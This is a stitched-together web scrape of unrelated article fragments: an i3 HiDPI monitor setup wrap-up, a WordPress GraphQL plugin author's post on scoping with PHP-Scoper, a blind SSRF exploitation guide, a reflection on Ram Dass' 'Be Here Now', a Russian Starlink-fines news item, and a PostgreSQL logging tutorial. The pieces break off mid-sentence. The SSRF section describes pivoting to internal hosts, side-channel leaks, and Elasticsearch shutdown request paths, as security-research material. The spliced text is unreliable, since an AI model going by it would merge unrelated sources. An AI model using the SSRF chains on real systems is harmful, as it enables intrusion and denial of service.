i3-save-tree <span>--workspace</span> 1A <span>&gt;</span> ~/.config/i3/workspaces/1A.json
</pre></td></tr></tbody></table></code></pre></div></div>

<p>…and then fix them up manually to enable the appropriate application swallowing rules.</p>

<h3 id="hexchat">HexChat</h3>

<p>I use <a href="https://hexchat.github.io/index.html">HexChat</a> for IRC.</p>

<p>HexChat’s config file includes individual offsets for each of the sub-panes in the GUI,
which means that it breaks badly if you change your monitor dimensions. I couldn’t figure out
how to fix them, so I ended up deleting my main <code>~/.config/hexchat/hexchat.conf</code> entirely and
recreating my preferred layout from memory. YMMV.</p>

<h3 id="system-icons">System icons</h3>

<p>I didn’t have to make any changes with respect to my system icon sizes, which is <em>probably</em>
because I actually see very few icons during normal i3 usage. Once again, YMMV.</p>

<h2 id="wrapup">Wrapup</h2>

<p>Switching from a set of 3 FHD monitors to two 4K HiDPI ones was <em>relatively</em> painless. The
problems that I had, unsurprisingly, were primarily with the few proprietary applications I use
needing to be spoon-feed DPI information in their own ways — every other problem was
either a bug (OBS + Qt) or a matter of more general reconfiguration.</p>

His expression demonstrates that he believes there is only one GraphQL plugin, when in fact there are two (the one left out is, well, mine). That made me realize how little visibility my plugin has, and I felt bad about it.</p><p>Matt didn't know my plugin existed. Nor does most of the WordPress community, for that matter. Clearly I'm not publicizing it well enough. I know that I suck in marketing and social media; I'm just OK with technical stuff (or so I believe). So I decided to do something about it, at least within my capabilities.</p><p>So this is what I'm working on:</p><ul><li>I just finished coding this same website, <a href="https://graphql-api.com/">graphql-api.com</a>, and launched it 2 weeks ago (yay! 🥳 Btw, how do you like it? Be welcome to give me feedback, via <a href="https://twitter.com/losoviz/">DM</a> or <a href="mailto:leo@getpop.org">email</a>)</li><li>3 days ago, I finally started scoping the plugin, and finished this task yesterday! (At 3 am, but it was worth it 😅)</li><li>And finally, I'm already working on the upcoming version <code>0.8</code>, which will be the first one available in the plugin repository</li></ul><p>Scoping the plugin is mandatory to upload it to the repository, because otherwise it could conflict with a different plugin, which requires the same dependency as my plugin, but with a different version. Having done it is a really big milestone; no other development is as important. For instance, I must still complete the GraphQL schema to fully match the WordPress data model, but that will be done steadily on each new release.</p><p>So in a few weeks from now, the plugin will show up when searching for "GraphQL", and the people who are actually needing to implement a GraphQL API will get to know of my plugin's existence.</p><p>Indeed, I do want my plugin to be seriously considered for the future of WordPress. I've been working on it for several years now. <a href="https://github.com/leoloso/PoP">The repo</a> was started back in August 2016; that is even before WPGraphQL existed, and at the beginning of GraphQL. But I didn't know that the project would become a GraphQL server; it took that direction only around 1.5 years ago.</p><p>(The project is actually a framework to build applications using server-side components, and a GraphQL server could perfectly be built using this architecture. So then I just built it).</p><p>WPGraphQL is an established plugin, and rightly so: it was started a few years ago, and a community was built around it. The work by <a href="https://twitter.com/jasonbahl">Jason Bahl</a> (who is employed by Gatsby) and <a href="https://github.com/wp-graphql/wp-graphql/graphs/contributors">the contributors to his project</a> has been outstanding: integrating WordPress into the Jamstack is now easier than ever.</p><p>But one thing is Gatsby and the Jamstack, and another thing is WordPress. WordPress is 40% of the web, not just an input to a static site generator.</p><p>So now, we can consider if WPGraphQL is the right option, without having this decision taken for us out of lack of alternatives. We can now analyze both plugins to see whose goals are more aligned to what's important for WordPress.</p><p>The GraphQL API for WordPress can also work with the Jamstack. But its main objectives are, I believe, more splendid: To "democratize data publishing", so that editing an API becomes as easy as editing a post (something everyone can do), and to make WordPress become the OS of the web.</p><p>Once the plugin is available on the repository, I hope more people will try it out and say "Hey, this is so friking awesome! How comes I didn't know about this stuff before?".</p><p>And then, the choice of "the GraphQL plugin" is not pre-determined, and the WordPress community can consider both WPGraphQL and the GraphQL API for WordPress based on their own merits.</p><p>Now that my motivations are out of the way, let's talk technical stuff 🤓.</p><h2 id="heading-checking-out-the-options">Checking out the options<a href="#heading-checking-out-the-options"><span> permalink</span></a></h2><p>Scoping a plugin involves running some tooling, that takes the plugin code as input, and spits out the scoped plugin. No big deal, right? How hard can that be?</p><p><img src="https://graphql-api.com/images/dog-scope-plugin.jpg" alt="Talking technical" loading="lazy" width="505" height="494"></p><p>Well, depending on the codebase, just executing the scope command alone won't be enough. After that, we need to check for errors in the console, fix them, test the application thoroughly, identify errors and why they happen, fix them, and iterate. To get it completely right, it might require some time.</p><p>There are 2 libraries for scoping, which have different goals:</p><ul><li><a href="https://github.com/coenjacobs/mozart">Mozart</a>, for WordPress code</li><li><a href="https://github.com/humbug/php-scoper">PHP-Scoper</a>, for any PHP code, particularly when producing PHARs</li></ul><p>Because I have a WordPress plugin, I tried out Mozart first. Let's see how it fared.</p><h2 id="heading-trying-out-mozart-and-failing">Trying out Mozart, and failing<a href="#heading-trying-out-mozart-and-failing"><span> permalink</span></a></h2><p>I tried Mozart around 1 year ago. For what it says in the documentation, "the <code>mozart compose</code> command does all the magic". So I expected it all to be very quick and simple, and go enjoy a daiquiri for the rest of the day.</p><p>Alas, Mozart never worked for my codebase. It kept running into issues, so the scoping never materialized. And I couldn't get the required assistance: I submitted a PR, but <a href="https://github.com/coenjacobs/mozart/pull/36#issuecomment-633013728">it was not considered for merging</a>, and I was not even notified about it, so I kept waiting until I naturally lost interest in this project.</p><p>I believe that Mozart couldn't handle some of the dependencies in my plugin. I'm making use of several of Symfony's components, including <a href="https://symfony.com/doc/current/components/dependency_injection.html">DependencyInjection</a>, <a href="https://symfony.com/doc/current/components/cache.html">Cache</a> and <a href="https://github.com/symfony/dotenv">Dotenv</a>, with everything managed through Composer.</p><p>Scoping PHP is not just about PHP, so the scoper will have many hurdles to avoid and challenges to solve. For instance, Symfony DependencyInjection uses <code>YAML</code> files to set-up configuration, and these must be scoped too. And the <code>composer.json</code> file contains the configuration for <code>PSR-4</code> autoloading, and this must be scoped too. And, I believe, Mozart couldn't handle these complexities properly.</p><p>But I'm sure that my experience is not the only one, and that there are many happy users our there. Also, my failed attempt happened 1 year ago, so I wonder if the tool has been improved since then. And then, don't forget the saying: "All scoped plugins are alike; each unscoped plugin is unscoped in its own way", so possibly it fails just for me.</p><p>If your WordPress plugin is simple, with self-contained logic, and scoping must be performed within PHP code only, then chances are that Mozart will work. You just gotta find out.</p><h2 id="heading-checking-php-scoper-and-coming-out-in-panic">Checking PHP-Scoper, and coming out in panic<a href="#heading-checking-php-scoper-and-coming-out-in-panic"><span> permalink</span></a></h2><p>So I headed for PHP-Scoper. However, I never even tried to try it, because I got frightened immediately by it.</p><p>To start with, <a href="https://github.com/humbug/php-scoper#wordpress">this tool does not naturally support WordPress</a>. And to continue, they recommend to take a look at <a href="https://github.com/humbug/php-scoper/blob/master/Makefile">their own Makefile</a>, which looks like this:</p><pre><code><span></span><br><span>MAKEFLAGS <span>+=</span> --warn-undefined-variables</span><br><span>MAKEFLAGS <span>+=</span> --no-builtin-rules</span><br><span></span><br><span>.DEFAULT_GOAL :<span>=</span> <span>help</span></span><br><span></span><br><span><span>PHPBIN</span><span>=</span>php</span><br><span><span>PHPNOGC</span><span>=</span>php -d zend.enable_gc<span>=</span><span>0</span></span><br><span><span>IS_PHP8</span><span>=</span><span><span>$(</span>shell php -r <span>"echo version_compare(PHP_VERSION, '8.0.0', '&gt;=') ?

It looks like a riddle. Believing that I needed to understand that code just to scope my plugin, made me flee unceremoniously.</p><p>(Well, understanding that code is their recommendation to test the scoped application, but it is not required. We can also just run the command <code>php-scoper add-prefix</code>, let it do all the magic, and go drink our daiquiris.)</p><h2 id="heading-coming-back-to-php-scoper-this-time-for-good">Coming back to PHP-Scoper, this time for good<a href="#heading-coming-back-to-php-scoper-this-time-for-good"><span> permalink</span></a></h2><p>So, 3 days ago, I took a decision to implement scoping, somehow. I had to make it happen.</p><p>I came back to PHP-Scoper, to try it out in earnest. I knew that WordPress could be scoped with it from reading <a href="https://deliciousbrains.com/php-scoper-namespace-composer-depencies/">PHP Scoper: How to Avoid Namespace Issues in your Composer Dependencies</a> (by the brilliant folks from Delicious Brains). It was just a matter of attitude, and perseverence.</p><p>I explored some of the existing solutions, including:</p><ul><li><a href="https://github.com/humbug/php-scoper/issues/442#issuecomment-736598602">This one</a> by Lucas Bustamante</li><li><a href="https://github.com/Yoast/wordpress-seo/blob/11.3/src/config/dependency-management.php">This one</a> by Yoast</li><li><a href="https://github.com/google/site-kit-wp/blob/80e3bd88317bf20bc5e5d6600428692fa8e3fc08/includes/loader.php">This one</a> by Google Site Kit</li><li><a href="https://github.com/google/web-stories-wp/blob/main/scoper.inc.php">This one</a> by Google Web Stories</li></ul><p>But they all look not fully satisfying to me: either the code seems hacky, or fragile and waiting to break at some time or another.</p><p>For instance, the Google Web Stories plugin scopes the code, and then reverts back each one of the conflicts:</p><pre><code><span><span>return</span> <span>[</span></span><br><span>  <span>'patchers'</span>                   <span>=&gt;</span> <span>[</span></span><br><span>		<span>function</span> <span>(</span> <span>$file_path</span><span>,</span> <span>$prefix</span><span>,</span> <span>$contents</span> <span>)</span> <span>{</span></span><br>			<br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\_doing_it_wrong"</span><span>,</span> <span>'\\_doing_it_wrong'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\__"</span><span>,</span> <span>'\\__'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_html_e"</span><span>,</span> <span>'\\esc_html_e'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_html"</span><span>,</span> <span>'\\esc_html'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_attr"</span><span>,</span> <span>'\\esc_attr'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_url"</span><span>,</span> <span>'\\esc_url'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>      <span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\do_action"</span><span>,</span> <span>'\\do_action'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>      </span><br><span>    <span>}</span></span><br><span>  <span>]</span></span><br><span><span>]</span></span></code></pre><p>I understand why they do it, but I don't like it. Whenever a new WordPress function gets referenced, they need to make sure it also makes it to this list. It's too manual, too fragile.</p><p>So this was my challenge: Isn't there a simpler way to scope a plugin, and relying on code that we can present to our friends and colleagues …</p></div></div>

<h2 id="what-is-server-side-request-forgery-ssrf">What is Server Side Request Forgery (SSRF)?</h2>

<p>Server Side Request Forgery occurs when you can coerce a server to make arbitrary requests on your behalf. As the requests are being made by the server, it may be possible to access internal resources due to where the server is positioned in the network. On cloud environments, SSRF poses a more significant risk due to the presence of <a href="https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b">metadata endpoints</a> that may contain sensitive credentials or secrets.</p>

<h2 id="blind-ssrf">Blind SSRF</h2>

<p>When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as “Blind SSRF”. In such situations, how do we prove impact? This was an interesting discussion that was sparked by Justin Gardner on Twitter:</p>

<blockquote data-theme="dark"><p lang="en" dir="ltr">I've been finding a large amount of Blind SSRFs recently. What kind of one-shot RCE's have you guys used as pivots for these in the past? I've got access to some Kafka and a bunch of other things. <a href="https://twitter.com/nnwakelam?ref_src=twsrc%5Etfw">@nnwakelam</a> <a href="https://twitter.com/thedawgyg?ref_src=twsrc%5Etfw">@thedawgyg</a></p>— Justin Gardner (@Rhynorater) <a href="https://twitter.com/Rhynorater/status/1349290375312154625?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>


<p>If you can reach internal resources, there are a number of potential exploit chains that can be executed to prove impact. This blog post attempts to go into detail for each known exploit chain when leveraging blind SSRF, and will be updated as more techniques are discovered and shared.</p>

<p>You can find a GitHub repo with all of these techniques here: <a href="https://github.com/assetnote/blind-ssrf-chains">Blind SSRF Chains</a>.</p>

<p>Please send us a pull request on GitHub if you would like any more techniques to be added to this glossary.</p>

<h2 id="ssrf-canaries">SSRF Canaries</h2>

<blockquote data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">I tend to call them SSRF canaries, when chaining a blind SSRF to another SSRF internally which makes an additional call externally, or by an app-specific open redir or blind XXE. Confluence, Artifactory, Jenkins and JAMF have some that works well.</p>— Frans Rosén (@fransrosen) <a href="https://twitter.com/fransrosen/status/1349397387920502786?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>


<p>In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”.</p>

<p>This is when we can request an internal URL that performs another SSRF and calls out to your canary host. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.</p>

<p>This is an effective way to verify that an SSRF vulnerability has access to a internal networks or applications, and to also verify the presence of certain software existing on the internal network. You can also potentially pivot to more sensitive parts of an internal network using an SSRF canary, depending on where it sits.</p>

<h2 id="using-dns-datasources-and-altdns-to-find-internal-hosts">Using DNS datasources and AltDNS to find internal hosts</h2>

<p>With the goal being to find as many internal hosts as possible, DNS datasources can be utilised to find all records that point to internal hosts.</p>

<p>On cloud environments, we often see ELBs that are pointing to hosts inside an internal VPC. Depending on which VPC the asset you’re targeting is in, it may be possible to access other hosts within the same VPC.</p>

<p>For example, consider the following host has been discovered from DNS datasources:</p>

<pre><code>livestats.target.com -&gt; internal-es-livestats-298228113.us-west-2.elb.amazonaws.com -&gt; 10.0.0.82
</code></pre>

<p>You can make an assumption that the <code>es</code> stands for Elasticsearch, and then perform further attacks on this host. You can also spray all of these blind SSRF payloads across all of the “internal” hosts that have been identified through this method. This is often effective.</p>

<p>To find more internal hosts, I recommend taking all of your DNS data and then using something like <a href="https://github.com/infosec-au/altdns">AltDNS</a> to generate permutations and then resolve them with a <a href="https://github.com/blechschmidt/massdns">fast DNS bruteforcer</a>.</p>

<p>Once this is complete, identify all of the newly discovered internal hosts and use them as a part of your blind SSRF chain.</p>

<h2 id="side-channel-leaks">Side Channel Leaks</h2>

<p>When exploiting blind SSRF vulnerabilities, you may be able to leak some information about the response being returned. For example, let’s say that you have blind SSRF via an XXE, the error messages may indicate whether or not:</p>

<ul>
  <li>A response was returned</li>
</ul>

<p><code>Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.</code></p>

<p>vs.</p>

<ul>
  <li>Host and port are unreachable</li>
</ul>

<p><code>Error parsing request: System.Net.WebException: Unable to connect to the remote server</code></p>

<p>Similarly, outside of XXEs, a web application could also have a side channel leak that can be ascertained by inspecting differences within the:</p>

<ul>
  <li><strong>Response status code</strong>:</li>
</ul>

<p>Online internal asset:port responds with <code>200 OK</code> vs offline internal asset:port <code>500 Internal Server Error</code></p>

<ul>
  <li><strong>Response contents</strong>:</li>
</ul>

<p>The response size in bytes is smaller or bigger depending on whether or not the URL you are trying to request is reachable.</p>

<ul>
  <li><strong>Response timing</strong>:</li>
</ul>

<p>The response times are slower or faster depending on whether or not the URL you are trying to request is reachable.</p>

<h2 id="elasticsearch">Elasticsearch</h2>

<p><strong>Commonly bound port: 9200</strong></p>

<p>When Elasticsearch is deployed internally, it usually does not require authentication.</p>

<p>If you have a partially blind SSRF where you can determine the status code, check to see if the following endpoints return a 200:</p>

<pre><code>/_cluster/health
/_cat/indices
/_cat/health
</code></pre>

<p>If you have a blind SSRF where you can send POST requests, you can shut down the Elasticsearch instance by sending a POST request to the following path:</p>

<p>Note: the <code>_shutdown</code> API has been removed from Elasticsearch version 2.x. and up. This only works in Elasticsearch 1.6 and below:</p>

<pre><code>/_shutdown
/_cluster/nodes/_master/_shutdown

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody" role="main"><p>A reflection on Ram Dass’ 1971 classic, <em>Be Here Now</em>, and the book’s connection to information and our state of being.</p>

<p>Like many who walk the hallways of elite institutions, Ram Dass’ life intersected with influential mid-century thinkers and doers. His most famous collaborator might have been Timothy Leary in the early 1960s. Their landmark studies of psychedelic drugs lead to his dismissal from Harvard in 1963.</p>
<p>Ram Dass’ association with David Padwa is of more immediate interest to me. Padwa established a company called Basic Systems and became a millionaire by the time he met the young author in the late 1960s.<span><label for="sn-0"></label><span>From David Padwa’s <a href="http://www.cuke.com/people/padwa.htm">Curriculum Vitae</a>: “1960-1965. Founder and CEO of Basic Systems Inc.&nbsp;Principal offices in Cambridge, New York, Chicago, Pasadena, and Washington, DC. Firm specialized in educational and curricular technologies as well as the provision of systems integration services in education and training markets. In 1964 Xerox Corporation acquired Basic Systems; continued as division executive at Xerox and Director of Planning for educational markets.”</span></span> Basic Systems automated employee training and student education, often integrating into an institution’s existing computer infrastructure.</p>
<p>The company caught the eye of Xerox Corporation and was soon acquired. It fit nicely with Xerox’s growing digital portfolio. As the copier company sought to establish the office of the future, it would soon acquire the influential minicomputer manufacturer <a href="https://www.computerhistory.org/revolution/minicomputers/11/340">Scientific Data Systems</a> and establish the legendary <a href="https://en.wikipedia.org/wiki/PARC_(company)">Xerox PARC</a>.</p>
<figure>
<img src="https://schmud.de/img/2020-12-16-be-here-now/karateka-2.png" alt="Karateka Atari 7800 (1988)"> <em>Karateka</em> Atari 7800 (1988) <i></i> <a href="https://boardgamegeek.com/images/thing/77183/karateka-1984">Board Game Geek</a>
</figure>
<p>Padwa founded Basic Systems with the influential psychologist Francis Mechner. I was first exposed to Francis Mechner as a child playing <em>Karateka</em> (1984) on my Atari 7800<span><label for="sn-1"></label><span>The original version was written by Jordan Mechner and published by Broderbund in 1984. The Atari 7800 version was written by Jack Sandberg, Sr.&nbsp;at Ibid Inc.&nbsp;and published by Atari in 1987.</span></span> and then later <em>Prince of Persia</em> (1989) on my family’s PC. Francis Mechner was the composer for these games, both written by his son <a href="http://jordanmechner.com/">Jordan Mechner</a>. The elder Mechner is something of a renaissance man: starting several successful businesses, speaking five languages, publishing cross-disciplinary theoretical insights, performing as a concert pianist, and achieving a 5-dan rating in Go.<span><label for="sn-2"></label><span>Padwa and Mechner’s company also published the <a href="https://books.google.it/books?id=TnVYAAAAYAAJ&amp;redir_esc=y">original edition</a> of “Bobby Fischer Teaches Chess” in 1966. The best-selling book is still in print today.</span></span></p>
<p>These characters provide a sampling of the environment that nurtured Ram Dass. He would soon leave these comforts to join Padwa and his Land Rover on a road trip from Tehran to India in search of a spiritual awakening.</p>
<p>Ram Dass ultimately stayed in India for some time (as did Padwa’s Land Rover), leading to the insights that birthed the book <em>Be Here Now</em>. This book’s influence is without question. It was a significant contributor to the American counterculture movement and a starting point for many Western practitioners of Buddhism and Yoga.</p>

<figure>
<img src="https://schmud.de/img/2020-12-16-be-here-now/be-here-now.webp" alt="Be Here Now by Ram Dass (1971)"> <em>Be Here Now</em> by Ram Dass (1971) <i></i> <a href="https://www.gardenfairyco.com/product/be-here-now-ram-dass">Garden Fairy Co.</a>
</figure>
<p>Ram Dass spends the first part of the book describing his journey. It involves a dive into the world of psychedelic drugs and their benefits and limitations. His experience essentially opens him up to Eastern mysticism. He finds surprisingly few charlatans on the road through Central Asia and India. The book’s pivotal guru broadens Ram Dass’ mind through a process of “no teaching” because “his lessons aroused in me just affirmation… as if I knew it all already.”</p>
<p>The author strikes an important difference between <em>teacher</em> and <em>guru</em>. “A teacher points the way” while “a guru is the way.” Ram Dass’ awakening, and this book, is the result of the guru’s care.</p>
<p>This leads to a beautifully illustrated but overtly dogmatic section where Ram Dass attempts wake the reader up. The writer’s intention is rooted in Buddhism’s long practice of shifting the practitioner’s habitual and unquestioned perception of the world.<span><label for="sn-3"></label><span>The guru offers a few clever turns of phrases in this effort, “If a pickpocket meets a saint, he sees only his pockets” and “If you wear shoe leather, the whole earth is covered with leather.”</span></span> Ram Dass’ spiritual youth feels most pronounced here. He doesn’t have the language of a guru or a teacher; it is the voice of an enthusiastic lecturer who is convinced that he has uncovered the Truth.</p>
<p>The final section of the book is a collection of quotes and techniques divided into various “ingredients for a sacred life” such as <em>Sleeping</em>, <em>Truth</em>, <em>Time and Space</em>, <em>Pranayam</em>, etc…. It is pleasant reading.</p>
<p>Ram Dass makes it clear that there can be no <em>knower</em> if one truly wants to <em>know</em> the wisdom contained in <em>Be Here Now</em>; the rational mind that separates <em>subject</em> from <em>object</em> is an illusion.<span><label for="sn-4"></label><span>(Loc. 4594, 4613)</span></span> This illusion is driven by an attachment to the self as special and wholly separate from everything else.</p>

</figure>
<p>Deep within the cartridge of <em>Karateka</em> on the Atari 7800 are a list of instructions that drive the machine. But the programmer did mix in one human-readable message with the computer code: “Mommy and Me Are One.” This bizarre statement is unique to the Atari 7800 cartridge. It does not appear in other versions. It never appears on screen. It is only visible to those who are looking at the code contained within.<span><label for="sn-5"></label><span>“<a href="https://www.digitpress.com/eastereggs/78karateka.htm">Digital Press Easter Eggs: Karateka</a>”, <em>digitpress.com</em>, 2010.</span></span></p>
<p>The phrase is almost certainly related to a paper published by Lloyd Silverman and Joel Weinberger in a 1985 edition of <em>American Psychologist</em> entitled “<a href="https://content.apa.org/doiLanding?doi=10.1037%2F0003-066X.40.12.1296">Mommy and I Are One: Implications For Psychotherapy</a>”. The authors assert that the titular message can help motivate people even when stated subliminally.</p>
<p>Countless studies have attempted to demonstrate the benefits of “oneness.” In the case of the mother, oneness is self-evident. We were all physically connected at one point. And deep within us exists a DNA code that has been directly passed from mother to child for millennia. This is the ancient information that sets the foundation for consciousness.</p>
<p>The reality of a consciousness larger than ourselves is at the root of <em>Be Here Now.</em> But rather than establish a God or a single methodology, Ram Dass continually asserts that the ego blinds us to the grand web of connections that pervade our everyday experience. The way to lift the veil is to simply practice living in the moment. Or as Suzuki Roshi is quoted, “a Zen student must learn to waste time conscientiously.”<span><label for="sn-6"></label><span>(Loc. 4728)</span></span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://relayvibes.co/tag/russia">Russia</a>‘s parliament, is looking at placing fines on individuals and companies in the country who use Western-based satellite Internet services. The bill, if passed into law, is to avoid access to the Internet using <a href="https://relayvibes.co/tag/spacex">SpaceX</a>‘s Starlink service, OneWeb, or other network means aside Russian satellite constellations under development.</p>
<p>in the Russian edition of Popular Mechanics</p>
<p>According to a recent report , the proposed fines is ranging from 10-30 thousand rubles ($135-$405) for ordinary users, and from 500 thousand to 1 million rubles ($6,750 to $13,500) for companies who make use of the Western satellite services.</p>
<p>In response to the news, Elon Musk has responded to the tweet with “We’re just trying to get people to Mars. Help would be appreciated”</p>
<p>Members of the Duma believe that accessing the Internet freely would skip the country’s System of Operational Search Measures, which is monitoring Internet usage and mobile communications..<br>
Being part of the Russia’s strict control on media and communications, all Russian Internet traffic are compelled to navigate via a Russian communications provider.</p>
<p>Russia may, over time, however, block Starlink service. Dmitry Rogozin, Russia;s Space chief sees SpaceX as a chief competitor in spaceflight.</p>
<p>Starlink, Rogozin had said in August 2020 that it’s part of “a rather marauding, strong, high-technology policy of the United States, which makes use of Shock and Awe so as to improve, ahead of other, their military interests.</p>
<p>The ban on OneWeb is rather funny, with the notion that the company uses the Russian Soyuz rocket to launch almost all of its fist constellation into orbit. Every month, OneWeb satellite launches are planned, mainly from spaceports in Baikonur, Kazahkstan, and Vostochny, Russia. OneWeb is effectively assisting to shore the striving Russian launch industry in a period when SpaceX is undersell the country on commercial launch agreements.</p>
<p>Russia has it in plan to design its own satellite internet constellation, Sfera. While its affordability is yet to stand, it is most likely to be launched in 2024, according to IntelliNews. Expected cost of the project is about 1.5 trillion rubles (around $20 billion), it would supposedly allow the Russia to effectively monitor domestic internet traffic,</p>

            <p>PostgreSQL comes with a plethora of configuration options, but changing the
default settings of some of these options drastically improves the observability
of your PostgreSQL server. You’ll want to set and configure these options before
issues crop up in production, as they can provide information essential to
understanding and resolving those issues.</p>

<p>Read on to learn more about the settings and extensions that expose metrics and
information about the inner workings of your PostgreSQL server.</p>

<h3 id="log-line-prefix">Log Line Prefix</h3>

<p>The <em>log_line_prefix</em> configuration option determines what PostgreSQL writes at
the beginning of each log line. The default depends on the specific Linux
distribution or managed solution that you’re using, but more often than not it
does not include a few items that can prove very useful in tracking down
misbehaving clients. Try this <em>log_line_prefix</em>:</p>

<figure><pre><code data-lang="ini"><span>log_line_prefix</span> <span>=</span> <span>'%m [%p] %a %u %d %h '</span></code></pre></figure>

<p>It includes the timestamp (<em>%m</em>), the PID of the backend process (<em>%p</em>), the
application name (<em>%a</em>) of the client, the username which the client has connected
with (<em>%u</em>), the database which the client has connected to (<em>%d</em>) and the
hostname or IP where the connection is coming from (<em>%h</em>). This results in log
lines like this:</p>

<figure><pre><code data-lang="none">2021-01-30 05:06:03.675 UTC [73] psql postgres bench 172.17.0.1 ERROR:  relation "pgbench_akkounts" does not exist at character 15

<p>which are much more useful than the default. You can see that a client connected
from <em>172.17.0.1</em> as user <em>postgres</em> to database <em>bench</em>, and the application
was <em>psql</em>. Definitely an improvement over the default option, which shows
only this:</p>

<figure><pre><code data-lang="text">2021-01-30 05:13:22.630 UTC [63] ERROR:  relation "pgbench_akkounts" does not exist at character 15

<h3 id="logging-slow-queries">Logging Slow Queries</h3>

<p>PostgreSQL can be configured to log queries that take more than a set amount
of time to execute. These go into the same log file; there is no separate
slow query log file as in MySQL.</p>

<p>To log statements that take more than 1 second to execute, use the
<em>log_min_duration_statement</em> option like this:</p>

<figure><pre><code data-lang="ini"><span>log_min_duration_statement</span> <span>=</span> <span>1s</span></code></pre></figure>

<p>Note that <em>log_min_duration_statement</em> will consider all statements (including
for example, long-running admin statements like <em>REINDEX TABLE</em>) and not just
queries (<em>SELECT</em>). Here are some log entries produced by this option:</p>

<figure><pre><code data-lang="text">2021-01-30 08:42:57.473 UTC [62] psql postgres postgres 172.17.0.1 LOG:  duration: 1016.283 ms  statement: select pg_sleep(1);
2021-01-30 08:52:00.541 UTC [62] psql postgres postgres 172.17.0.1 LOG:  duration: 1118.277 ms  statement: select pg_sleep(1.1);</code></pre></figure>

<p>If this results in too many logs of similar statements, you can tell Postgres to
log only a percentage of it, using:</p>

<figure><pre><code data-lang="ini"><span>log_min_duration_statement</span> <span>=</span> <span>-1</span>
<span>log_min_duration_sample</span> <span>=</span> <span>1s</span>
<span>log_statement_sample_rate</span> <span>=</span> <span>0.25</span></code></pre></figure>

<p>This logs only 25% of the statements that become eligible for logging (the ones
that took more than 1 second to execute). The log output is the same as before.
There is no way to know how many eligible statements were not logged.</p>

<p>To log all statements, along with the time taken to execute them, use the
<em>log_statement</em> option instead:</p>

<figure><pre><code data-lang="ini"><span>log_statement</span> <span>=</span> <span>mod</span>
<span>log_duration</span> <span>=</span> <span>on</span></code></pre></figure>

<p>The ‘mod’ option tells Postgres to log DDLs and data-modifying statements. This
results in logs like these:</p>

<figure><pre><code data-lang="text">2021-01-30 08:35:08.985 UTC [64] pgbench postgres bench 172.17.0.1 LOG:  statement: insert into pgbench_tellers(tid,bid,tbalance) values (10,1,0)
2021-01-30 08:35:08.985 UTC [64] pgbench postgres bench 172.17.0.1 LOG:  duration: 0.241 ms</code></pre></figure>

<p>Be warned that it is <em>not</em> possible to sample statement logging enabled this way,
all statements will be logged, and you’ll end up with tons of log entries.</p>

<h3 id="logging-locks-and-deadlocks">Logging Locks and Deadlocks</h3>

<p>Queries can wait too long to acquire a lock. Typically, an upper limit on how
long to wait is set using the option <em>lock_timeout</em>, usually at the client side.
If a query has been waiting this long to acquire a lock, Postgres will cancel
the execution of this query and log an error:</p>

<figure><pre><code data-lang="text">2021-01-30 09:35:52.415 UTC [67] psql postgres testdb 172.17.0.1 ERROR:  canceling statement due to lock timeout
2021-01-30 09:35:52.415 UTC [67] psql postgres testdb 172.17.0.1 STATEMENT:  cluster t;</code></pre></figure>

<p>Let’s say you want to set a lock timeout of 1 minute, but log queries that
wait for locks for more than, say 30 seconds. You can do this using:</p>

<figure><pre><code data-lang="ini"><span>log_lock_waits</span> <span>=</span> <span>on</span>
<span>deadlock_timeout</span> <span>=</span> <span>30s</span></code></pre></figure>

<p>This will create logs like this:</p>

<figure><pre><code data-lang="text">2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 LOG:  process 70 still waiting for ShareLock on transaction 493 after 30009.004 ms
2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 DETAIL:  Process holding the lock: 68. Wait queue: 70.
2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 CONTEXT:  while locking tuple (0,3) in relation "t"
2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 STATEMENT:  select * from t for update;</code></pre></figure>

<p>The use of <em>deadlock_timeout</em> is not a typo: it is the value that the lock wait
logging mechanism uses. Ideally, there should have been something like <em>log_min_duration_lock_wait</em>,
but unfortunately, that is not the case.</p>

<p>In case of actual deadlocks, Postgres will abort the deadlocked transactions
after <em>deadlock_timeout</em> duration, and will log the offending statements. No
explicit configuration is necessary.</p>

<figure><pre><code data-lang="text">2021-01-30 09:55:37.724 UTC [68] psql postgres testdb 172.17.0.1 LOG:  process 68 detected deadlock while waiting for ShareLock on transaction 496 after 30007.633 ms

<h3 id="logging-autovacuums">Logging Autovacuums</h3>

<p>The autovacuum process kicks in when Postgres determines the data in a table
has changed sufficiently to warrant a vacuum and analyze. To keep an eye on
this process, enable the logging of autovacuum runs:</p>

<figure><pre><code data-lang="ini"><span>log_autovacuum_min_duration</span> <span>=</span> <span>250ms</span></code></pre></figure>

<p>Here is a sample entry that was caused by excessive changes to one table:</p>

